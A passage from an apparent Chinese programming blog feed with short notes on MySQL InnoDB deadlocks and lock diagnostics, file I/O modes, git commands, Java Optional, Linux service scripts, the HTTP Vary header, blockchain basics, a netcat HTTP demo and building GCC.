`idx_source_sid` (`source`,`sid`)</span><br><span class="line">)ENGINE<span class="operator">=</span>InnoDB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert into</span> question(source, sid, create_at) <span class="keyword">values</span> (<span class="string">&#x27;us&#x27;</span>, <span class="number">100</span>, unix_timestamp(now()));</span><br><span class="line"><span class="keyword">insert into</span> question(source, sid, create_at) <span class="keyword">values</span> (<span class="string">&#x27;us&#x27;</span>, <span class="number">101</span>, unix_timestamp(now()));</span><br><span class="line"><span class="keyword">insert into</span> question(source, sid, create_at) <span class="keyword">values</span> (<span class="string">&#x27;us&#x27;</span>, <span class="number">102</span>, unix_timestamp(now()));</span><br></pre></td></tr></table></figure><table><thead><tr><th>Session A</th><th>Session B</th></tr></thead><tbody><tr><td>start transaction;</td><td>start transaction;</td></tr><tr><td>delete from question where source &#x3D; ‘us’ and sid &#x3D; 100;</td><td>delete from question where source &#x3D; ‘us’ and sid &#x3D; 101;</td></tr><tr><td>insert into question(source, sid, create_at) values (‘us’, 100, unix_timestamp(now()));</td><td></td></tr><tr><td></td><td>insert into question(source, sid, create_at) values (‘us’, 101, unix_timestamp(now()))</td></tr><tr><td></td><td>DEADLOCK</td></tr><tr><td>commit</td><td>commit</td></tr></tbody></table><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ol><li><p>查看事务隔离级别</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@global</span>.tx_isolation;</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@session</span>.tx_isolation;</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@tx_isolation</span>;</span><br></pre></td></tr></table></figure></li><li><p>设置隔离级别</p><p> SET [SESSION | GLOBAL] TRANSACTION ISOLATION LEVEL {READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE}<br> 例如：set session transaction isolation level read uncommitted;</p></li><li><p>查看auto_increment机制模式</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;innodb_autoinc_lock_mode&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p>查看表状态</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">table</span> status <span class="keyword">like</span> <span class="string">&#x27;plan_branch&#x27;</span>\G;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">table</span> status <span class="keyword">from</span> test <span class="keyword">like</span> <span class="string">&#x27;plan_branch&#x27;</span>\G;</span><br></pre></td></tr></table></figure></li><li><p>查看SQL性能</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> profiles</span><br><span class="line"><span class="keyword">show</span> profile <span class="keyword">for</span> query <span class="number">1</span>;</span><br></pre></td></tr></table></figure></li><li><p>查看当前最新事务ID</p><p> 每开启一个新事务，记录当前最新事务的id，可用于后续死锁分析。 </p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> engine innodb status\G;</span><br></pre></td></tr></table></figure></li><li><p>查看事务锁等待状态情况</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 所有innodb正在等待的锁，和被等待的锁</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.innodb_locks;</span><br><span class="line"># 查看等待锁的事务</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.innodb_lock_waits;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.innodb_trx;</span><br></pre></td></tr></table></figure></li><li><p>查看innodb状态(包含最近的死锁日志)</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> engine innodb status;</span><br></pre></td></tr></table></figure></li><li><p>查看所有连接</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">full</span> processlist;</span><br></pre></td></tr></table></figure></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-transaction-isolation-levels.html">Transaction Isolation Levels</a></li><li><a href="https://ristret.com/s/f643zk/history_transaction_histories">A History of Transaction Histories</a></li><li><a href="http://hedengcheng.com/?p=771">MySQL 加锁处理分析</a></li><li><a href="http://www.fanyilun.me/2017/04/20/MySQL%E5%8A%A0%E9%94%81%E5%88%86%E6%9E%90">MySQL加锁分析</a></li><li><a href="http://yeshaoting.cn/article/database/mysql%20insert%E9%94%81%E6%9C%BA%E5%88%B6/">mysql insert锁机制</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件模式</title>
      <link href="/post/file-mode.html"/>
      <url>/post/file-mode.html</url>
      
        <content type="html"><![CDATA[<h2 id="文件模式"><a href="#文件模式" class="headerlink" title="文件模式"></a>文件模式</h2><p>文件 I&#x2F;O 操作将在文本或二进制这两种转换模式之一中进行，具体取决于文件时在哪种模式下打开的。数据文件通常在文本模式下处理，这可以给我们提供一下便利的操作。</p><h3 id="二进制模式与文本模式"><a href="#二进制模式与文本模式" class="headerlink" title="二进制模式与文本模式"></a>二进制模式与文本模式</h3><p>物理上计算机上所有的文件都是以二进制方式存储的。如果我们知道文件是一个文本，我们可以使用文本模式读写文件。文本模式下，我们可以以行为单位读取写入，不然我们需要手动去处理换行符。</p><p>在二进制模式下换行符会作为一个字节，文本模式下读取时会忽略换行符。</p><p>文本文件，操作系统会对’\n’进行一些隐式变换，因此文本文件直接跨平台使用会出问题。</p><ul><li>在Windows下，写入<code>\n</code>时，操作系统会隐式的将<code>\n</code>转换为<code>\r\n</code>，再写入到文件中；读的时候，会把<code>\r\n</code>隐式转化为<code>\n</code>，再读到变量中。</li><li>在Linux下，写入<code>\n</code>时，操作系统不做隐式变换。</li></ul><p>二进制文件，操作系统不会对’\n’进行隐式变换，很多二进制文件（如电影、图片等）可以跨平台使用。如果我们使用文本模式<strong>先读后写</strong>二进制文件可能照成文件损坏。</p><p>例如我们读取一张图片，如果是文本模式(readLine)就会直到遇到<code>\n</code>这个字符一次读取才结束。但是，实际上<code>\n</code>这个字符不像在文本中具有特殊意义，这种读取方式是毫无意义的。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://docs.microsoft.com/zh-cn/cpp/c-runtime-library/text-and-binary-mode-file-i-o">文本和二进制模式文件 I&#x2F;O</a></li><li><a href="http://blog.csdn.net/timberwolf_2012/article/details/28499615">文本文件和二进制文件比较</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> file </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git</title>
      <link href="/post/git.html"/>
      <url>/post/git.html</url>
      
        <content type="html"><![CDATA[<h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ol><li><a href="https://github.com/git/git/releases">下载</a>最新版</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/git/git/archive/v2.13.2.tar.gz</span><br><span class="line">tar -zxf v2.13.2.tar.gz</span><br></pre></td></tr></table></figure><ol start="2"><li>编译安装</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum -y install gcc gcc-c++ make libtool zlib zlib-devel openssl openssl-devel  </span><br><span class="line"></span><br><span class="line">sudo make prefix=/usr/local install</span><br></pre></td></tr></table></figure><blockquote><p>指定 prefix 为 &#x2F;usr&#x2F;local 会安装到 &#x2F;usr&#x2F;local&#x2F;bin 下，指定 prefix 为 &#x2F;use 会安装到&#x2F;usr&#x2F;bin 下。</p></blockquote><h3 id="私有git仓库"><a href="#私有git仓库" class="headerlink" title="私有git仓库"></a>私有git仓库</h3><p><a href="https://www.liaoxuefeng.com/article/001373894410719a19c79d040c84fd4a7492efc60081be1000">https://www.liaoxuefeng.com/article/001373894410719a19c79d040c84fd4a7492efc60081be1000</a></p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><ol><li><p>设置代理</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global https.proxy http://127.0.0.1:1080</span><br><span class="line">git config --global --unset http.proxy</span><br></pre></td></tr></table></figure></li><li><p>中文编码</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global core.quotepath false</span><br></pre></td></tr></table></figure></li></ol><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><h4 id="revert"><a href="#revert" class="headerlink" title="revert"></a>revert</h4><p><code>revert</code>会丢弃掉提交，并生成一个新的<code>commit</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git revert HEAD # 丢弃掉最新的提交</span><br><span class="line">git revert HEAD^ 或 git git revert HEAD~1 # 丢弃掉倒数第二次提交 HEAD^^倒数第三次，等同于HEAD~2</span><br><span class="line">git revert bb72c804 # 丢弃掉提交</span><br></pre></td></tr></table></figure><h4 id="reset"><a href="#reset" class="headerlink" title="reset"></a>reset</h4><p><code>reset</code>恢复为某次提交，后面的变更会全部丢弃掉。</p><ul><li>–soft – 缓存区和工作目录都不会被改变。</li><li>–mixed – 默认选项。缓存区和你指定的提交同步，但<code>工作目录</code>不受影响。</li><li>–hard – 缓存区和<code>工作目录</code>都同步到你指定的提交。<blockquote><p>如果提交已经推送到远端仓库，<code>reset</code>后<code>push</code>时需要强制覆盖<code>-f</code>。</p></blockquote></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard HEAD^ # 恢复到上次提交</span><br><span class="line">git reset --hard bb72c804 # 回复到bb72c804</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://github.com/geeeeeeeeek/git-recipes/wiki/5.2-%E4%BB%A3%E7%A0%81%E5%9B%9E%E6%BB%9A%EF%BC%9AReset%E3%80%81Checkout%E3%80%81Revert-%E7%9A%84%E9%80%89%E6%8B%A9">代码回滚：Reset、Checkout、Revert 的选择</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java8 Optional</title>
      <link href="/post/java8-optional.html"/>
      <url>/post/java8-optional.html</url>
      
        <content type="html"><![CDATA[<h2 id="Java-Optional"><a href="#Java-Optional" class="headerlink" title="Java Optional"></a>Java Optional</h2><p><code>Optional</code>类是为了避免空指针问题在Java8中新增的一个类。<code>Optional</code>并不是真正避免避免空指针的，他只是用来<code>提醒</code>我们需要注意空指针问题，我们应该先调用它的<code>isPresent()</code>发放去检查一下实际的值是不是空。</p><p>函数返回值，我们时常会忘记判断返回值是不是空。如果返回值是<code>Optional&lt;T&gt;</code>类型，这会提醒我们去检查。</p><blockquote><p>注意：如果返回值是<code>Optional&lt;T&gt;</code>类型，我们都会假定这个返回值不可能是<code>null</code>，不然<code>Optional</code>类就毫无意义了。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> doSomething();</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">null</span> != str) System.out.print(str.get().length());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于如下</span></span><br><span class="line"></span><br><span class="line">Optional&lt;String&gt; str = doSomething(); <span class="comment">// 假定str不可能是null</span></span><br><span class="line"><span class="keyword">if</span> (str.isPresent()) System.out.print(str.get().length());</span><br></pre></td></tr></table></figure><h3 id="Optional-类使用说明"><a href="#Optional-类使用说明" class="headerlink" title="Optional 类使用说明"></a>Optional 类使用说明</h3><p><a href="http://www.importnew.com/6675.html">Java 8 Optional类深度解析</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux服务</title>
      <link href="/post/linux-service.html"/>
      <url>/post/linux-service.html</url>
      
        <content type="html"><![CDATA[<h2 id="Linux服务"><a href="#Linux服务" class="headerlink" title="Linux服务"></a>Linux服务</h2><p>Linux服务脚本位于<code>/etc/rc.d/init.d</code>，它是一个特殊的shell脚本。</p><h3 id="标准结构"><a href="#标准结构" class="headerlink" title="标准结构"></a>标准结构</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">chkconfig: 2345 20 80</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">description: Customized service</span></span><br><span class="line"></span><br><span class="line">start() &#123;</span><br><span class="line">    echo &#x27;This is my service, start command&#x27;</span><br><span class="line">    echo &#x27;&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stop() &#123;</span><br><span class="line">    echo &#x27;This is my service, stop command&#x27;</span><br><span class="line">    echo &#x27;&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">restart() &#123;</span><br><span class="line">    echo &#x27;This is my service, restart command&#x27;</span><br><span class="line">    echo &#x27;&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">status() &#123;</span><br><span class="line">    echo &#x27;This is my service, status command&#x27;</span><br><span class="line">    echo &#x27;&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case &quot;$1&quot; in </span><br><span class="line">    start)</span><br><span class="line">        start</span><br><span class="line">        ;;</span><br><span class="line">    stop)</span><br><span class="line">        stop</span><br><span class="line">        ;;</span><br><span class="line">    restart)</span><br><span class="line">        restart</span><br><span class="line">        ;;</span><br><span class="line">    status)</span><br><span class="line">        status</span><br><span class="line">        ;;</span><br><span class="line">    *)</span><br><span class="line">        echo &#x27;Usage: service myservice &#123;start|status|stop|restart&#125;&#x27;</span><br><span class="line">        ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure><blockquote><p><code>chkconfig: 2345 20 80</code> (这里作一下特殊说明: <code>20</code> 是该程序开机的启动优先级，值越小越优先；<code>80</code>是关机时的优先级，值越小越先关闭；这里就可以设定linux值的开关机顺序了）。如果某服务缺省不在任何运行级启动，那么使用 <code>-</code> 代替运行级。</p></blockquote><h3 id="Linux-进程运行的7个等级"><a href="#Linux-进程运行的7个等级" class="headerlink" title="Linux 进程运行的7个等级"></a>Linux 进程运行的7个等级</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">运行级别0：系统停机状态，系统默认运行级别不能设为0，否则不能正常启动</span><br><span class="line">运行级别1：单用户工作状态，root权限，用于系统维护，禁止远程登录</span><br><span class="line">运行级别2：多用户状态(没有NFS)</span><br><span class="line">运行级别3：完全的多用户状态(有NFS)，登录后进入控制台命令行模式</span><br><span class="line">运行级别4：系统未使用，保留</span><br><span class="line">运行级别5：X11控制台，登录后进入图形GUI模式</span><br><span class="line">运行级别6：系统正常关闭并重启，默认运行级别不能设为6，否则不能正常启动</span><br></pre></td></tr></table></figure><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><h4 id="注册服务"><a href="#注册服务" class="headerlink" title="注册服务"></a>注册服务</h4><blockquote><p>需要给予脚本执行权限<code>chmod +x myservice</code></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --add myservice</span><br></pre></td></tr></table></figure><h4 id="删除服务"><a href="#删除服务" class="headerlink" title="删除服务"></a>删除服务</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --del myservice</span><br></pre></td></tr></table></figure><h4 id="设置启动等级"><a href="#设置启动等级" class="headerlink" title="设置启动等级"></a>设置启动等级</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chkconfig [--level &lt;1-6&gt;] myservice [on/off/reset]</span><br><span class="line"># e.g.</span><br><span class="line">chkconfig --level 35 mysqld on</span><br></pre></td></tr></table></figure><h4 id="服务列表"><a href="#服务列表" class="headerlink" title="服务列表"></a>服务列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --list [name]</span><br></pre></td></tr></table></figure><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">chkconfig: 345 90 90</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">description: ss server</span></span><br><span class="line"></span><br><span class="line">start() &#123;</span><br><span class="line">    echo -ne &quot;Starting ss server\n&quot;</span><br><span class="line">    # 后台运行</span><br><span class="line">    /usr/local/bin/ss &gt; /dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stop() &#123;</span><br><span class="line">    echo -ne &quot;Stop ss server\n&quot;</span><br><span class="line">    # 根据端口号杀死进程</span><br><span class="line">    fuser -k 1080/tcp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">restart() &#123;</span><br><span class="line">    stop</span><br><span class="line">    start</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">status() &#123;</span><br><span class="line">    fuser 1080/tcp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case &quot;$1&quot; in </span><br><span class="line">    start)</span><br><span class="line">        start</span><br><span class="line">        ;;</span><br><span class="line">    stop)</span><br><span class="line">        stop</span><br><span class="line">        ;;</span><br><span class="line">    restart)</span><br><span class="line">        restart</span><br><span class="line">        ;;</span><br><span class="line">    status)</span><br><span class="line">        status</span><br><span class="line">        ;;</span><br><span class="line">    *)</span><br><span class="line">        echo &#x27;Usage: service ss &#123;start|stop|restart|status&#125;&#x27;</span><br><span class="line">        ;;</span><br><span class="line">esac </span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://blog.fudenglong.site/2017/03/24/Linux%E8%BF%9B%E7%A8%8B%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/">Linux进程启动脚本编写</a></li><li><a href="https://my.oschina.net/itblog/blog/532889">Linux下编写自己的service</a></li><li><a href="http://blog.51cto.com/huanglianfeng/1363488">linux shell编写系统服务脚本</a></li><li><a href="https://www.cnblogs.com/panjun-Donet/archive/2010/08/10/1796873.html">Linux下chkconfig命令详解</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Http Vary</title>
      <link href="/post/http-vary.html"/>
      <url>/post/http-vary.html</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP-Vary"><a href="#HTTP-Vary" class="headerlink" title="HTTP Vary"></a>HTTP Vary</h1><p>好多时候我们在客户端和网站间有一层缓存层，如果缓存成只是根据<code>URL</code>来来作为<code>Key</code>缓存会出现一些问题。这主要是HTTP内容协商（Content Negotiation），同一个URL的对应的内容可能是不一样的。</p><p>例如，我们可以返回gzip压缩版本和未压缩版本两种内容，还可以返回<code>JSON</code>类型和<code>HTML</code>类型。如果我们只根据<code>URL</code>来生成缓存Key肯定是有问题的，例如前一个请求客户端支持压缩版本，缓存成就会缓存下来一个压缩版本的内容，如果后面一个请求客户端不支持gzip压缩这时就出问题了。要解决这种问题，我就就要告诉缓存服务器遇到同一个 URL 对应着不同版本文档的情况时，如何缓存和筛选合适的版本。</p><table><thead><tr><th>请求头字段</th><th>说明</th><th>响应头字段</th></tr></thead><tbody><tr><td>Accept</td><td>告知服务器发送何种媒体类型</td><td>Content-Type</td></tr><tr><td>Accept-Language</td><td>告知服务器发送何种语言</td><td>Content-Language</td></tr><tr><td>Accept-Charset</td><td>告知服务器发送何种字符集</td><td>Content-Type</td></tr><tr><td>Accept-Encoding</td><td>告知服务器采用何种压缩方式</td><td>Content-Encoding</td></tr></tbody></table><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p><a href="webp.html#%E4%BE%8B%E5%AD%90">WebP</a></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://imququ.com/post/vary-header-in-http.html">HTTP 协议中 Vary 的一些研究</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Vary">Vary - HTTP | MDN</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> cdn </tag>
            
            <tag> http </tag>
            
            <tag> cache </tag>
            
            <tag> vary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链</title>
      <link href="/post/blockchain.html"/>
      <url>/post/blockchain.html</url>
      
        <content type="html"><![CDATA[<h2 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h2><h3 id="区块链是什么？"><a href="#区块链是什么？" class="headerlink" title="区块链是什么？"></a>区块链是什么？</h3><blockquote><p>有史以来最慢的分布式数据库。</p></blockquote><p>区块链是一种分布式数据库技术，每个节点都保有整个区块的全部数据。区块链是有一个一个的数据块链接而成，每个数据块分为块头、块体两部分。区块头包含<code>生成时间</code>、<code>区块体的Hash</code>、<code>上一个区块的Hash</code>等数据，区块体用于记录数据。</p><p>区块的<code>Hash</code>有区块头计算而成，区块头包含当前块的<code>Hash</code>和上一块的<code>Hash</code>。</p><p>由于是分布式的，必须保证节点之间的同步，所以新区块的添加速度不能太快。区块链链技术限制每10分钟才能生存一个新区块（2M），这主要通过控制计算块的<code>Hash</code>来实现，这也是现在区块链技术主要的问题，性能太差。</p><p>区块体用来记录数据，我们可以理解为数据库中的<code>Page</code>。</p><h3 id="区块链和比特币"><a href="#区块链和比特币" class="headerlink" title="区块链和比特币"></a>区块链和比特币</h3><p>比特币就是一个数字，区块链作为一个数据库记录用户的交易信息。这些信息记录在区块体中，现阶段每个区块体最大<code>1M</code>，每个区块体可以记录很多比特币交易信息。</p><p><img src="/images/QQ20180130-181634@2x.jpg"><br><img src="/images/QQ20180130-181850@2x.jpg"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://www.ruanyifeng.com/blog/2017/12/blockchain-tutorial.html">区块链入门教程</a></li><li><a href="http://www.ruanyifeng.com/blog/2018/01/bitcoin-tutorial.html">比特币入门教程</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> blockchain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP协议</title>
      <link href="/post/http.html"/>
      <url>/post/http.html</url>
      
        <content type="html"><![CDATA[<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><h3 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello, World."></a>Hello, World.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">rm -rf index.html</span><br><span class="line">touch index.html</span><br><span class="line"></span><br><span class="line">body=&quot;&lt;h1&gt;Hello, World.&lt;/h1&gt;&quot;</span><br><span class="line"></span><br><span class="line">echo -e &quot;HTTP/1.1 200 OK\r\n&quot; &gt;&gt; index.html</span><br><span class="line">echo -e &quot;content-type: text/html; charset=utf-8\r\n&quot; &gt;&gt; index.html</span><br><span class="line">echo -e &quot;content-length: $&#123;#body&#125;\r\n&quot; &gt;&gt; index.html</span><br><span class="line">echo -e &quot;connection: close\r\n&quot; &gt;&gt; index.html</span><br><span class="line">echo -e &quot;\r\n&quot; &gt;&gt; index.html</span><br><span class="line"></span><br><span class="line">echo &quot;$&#123;body&#125;&quot; &gt;&gt; index.html</span><br><span class="line"></span><br><span class="line">sudo nc -l 80 &lt; index.html </span><br></pre></td></tr></table></figure><p>访问<a href="http://127.0.0.1/">http://127.0.0.1</a></p><h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP&#x2F;1.1"></a>HTTP&#x2F;1.1</h3><h4 id="keep-alive"><a href="#keep-alive" class="headerlink" title="keep-alive"></a>keep-alive</h4><h4 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h4><h4 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h4><p><a href="/2017/11/13/chunked-transfer-encoding/">HTTP 分块传输编码</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> http </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GCC</title>
      <link href="/post/install-gcc.html"/>
      <url>/post/install-gcc.html</url>
      
        <content type="html"><![CDATA[<ol><li><p>下载gcc最新的源码包 <code>wget https://ftp.gnu.org/gnu/gcc/gcc-4.9.4/gcc-4.9.4.tar.gz</code>    </p></li><li><p>解压缩 <code>tar -zxvf gcc-4.9.4.tar.gz</code>    </p></li><li><p>cd gcc-4.9.4    </p></li><li><p>运行<code>download_prerequisites</code>脚本<code>./contrib/download_prerequisites</code> 。这个脚本会自动帮你下载所需要的依赖文件和库  </p></li><li><p>建立输出目录，将所有的中间文件都放到该目录    </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir gcc_temp</span><br><span class="line">cd gcc_temp</span><br></pre></td></tr></table></figure></li><li><p>运行 <code>../configure --enable-checking=release --enable-languages=c,c++ --disable-multilib</code>    </p></li><li><p>make &amp; make install</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> gcc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shadowsocks</title>
      <link href="/post/shadowsocks.html"/>
      <url>/post/shadowsocks.html</url>
      
